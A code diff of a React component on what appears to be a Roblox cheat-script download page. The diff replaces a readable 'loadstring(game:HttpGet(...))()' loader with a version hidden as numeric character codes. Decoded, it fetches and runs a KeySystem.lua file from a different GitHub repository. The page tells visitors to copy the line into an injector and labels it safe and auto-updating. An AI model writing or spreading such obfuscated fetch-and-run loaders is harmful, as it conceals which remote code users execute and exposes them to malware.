@@ -4,7 +4,7 @@ import { Copy, Check, Terminal } from 'lucide-react';
 
 export const ScriptSection = () => {
   const [copied, setCopied] = useState(false);
-  const scriptCode = `loadstring(game:HttpGet("https://raw.githubusercontent.com/LuminaScript/Main/source.lua"))()`;
+  const scriptCode = `loadstring(utf8.char((function() return table.unpack({ 108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,67,76,90,72,49,47,77,97,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,75,101,121,83,121,115,116,101,109,46,108,117,97,34,41,41,40,41 }) end)()))()`;
 
   const handleCopy = () => {
     navigator.clipboard.writeText(scriptCode);
@@ -19,9 +19,9 @@ export const ScriptSection = () => {
 
       <div className="container mx-auto px-6 relative z-10">
         <div className="max-w-3xl mx-auto text-center mb-10">
-          <h2 className="text-3xl md:text-4xl font-bold mb-4">Get the Script</h2>
+          <h2 className="text-3xl md:text-4xl font-bold mb-4">获取脚本</h2>
           <p className="text-slate-400">
-            Copy the loader below and execute it in your favorite executor (Solara, Synapse Z, Wave).
+            复制这个脚本然后放进注入器执行
           </p>
         </div>
 
@@ -64,12 +64,12 @@ export const ScriptSection = () => {
                 <code>
                   <span className="text-violet-400">loadstring</span>
                   <span className="text-slate-400">(</span>
-                  <span className="text-cyan-400">game</span>
-                  <span className="text-slate-400">:</span>
-                  <span className="text-yellow-400">HttpGet</span>
-                  <span className="text-slate-400">(</span>
-                  <span className="text-green-400">"https://raw.githubusercontent.com/LuminaScript/Main/source.lua"</span>
-                  <span className="text-slate-400">))()</span>
+                  <span className="text-cyan-400">utf8.char</span>
+                  <span className="text-slate-400">((</span>
+                  <span className="text-yellow-400">function()</span>
+                  <span className="text-slate-400">return table.unpack(</span>
+                  <span className="text-green-400">"{108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,68,67,76,90,72,49,47,77,97,105,110,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,75,101,121,83,121,115,116,101,109,46,108,117,97,34,41,41,40,41 }"</span>
+                  <span className="text-slate-400">) end)()))()</span>
                 </code>
               </pre>
             </div>
@@ -78,11 +78,11 @@ export const ScriptSection = () => {
           <div className="mt-6 flex justify-center gap-6 text-sm text-slate-500">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4" />
-               <span>Auto-updates enabled</span>
+               <span>自动更新</span>
              </div>
              <div className="flex items-center gap-2">
                <Check className="w-4 h-4" />
-               <span>Safe Execution</span>
+               <span>安全</span>
              </div>
           </div>
         </motion.div>
